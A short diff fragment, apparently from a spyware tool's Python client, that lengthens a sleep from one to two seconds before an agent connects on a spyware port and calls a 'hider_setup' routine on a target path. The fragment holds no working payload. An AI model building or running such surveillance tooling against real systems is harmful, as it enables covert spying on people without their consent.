@@ -30,7 +30,7 @@ def main():
             "sentSpyware.spy",
         )
     )
-    sleep(1)
+    sleep(2)
     spyAgent = Agent(HOST, PORT_SPYWARE)
     print(spyAgent.hider_setup(targetHiderPath))
 
